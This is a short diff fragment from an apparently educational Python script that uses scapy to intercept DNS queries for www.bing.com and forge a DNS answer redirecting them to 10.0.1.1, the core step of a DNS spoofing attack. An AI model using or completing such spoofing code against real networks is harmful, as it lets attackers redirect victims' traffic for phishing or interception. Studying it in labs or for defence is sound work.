@@ -12,7 +12,8 @@ def process_packet():
         qname = scapy_packet[scapy.DNSQR].qname
         if "www.bing.com" in qname:
             print("[+] Spoofing Target")
-            
+#rrname = website; rdata=ip of requested domain
+            answer = scapy.DNSRR(rrname=qname, rdata="10.0.1.1")
 #.show method shows all layers of packet
         #print(scapy_packet.show())
 #allow packet to its dest 
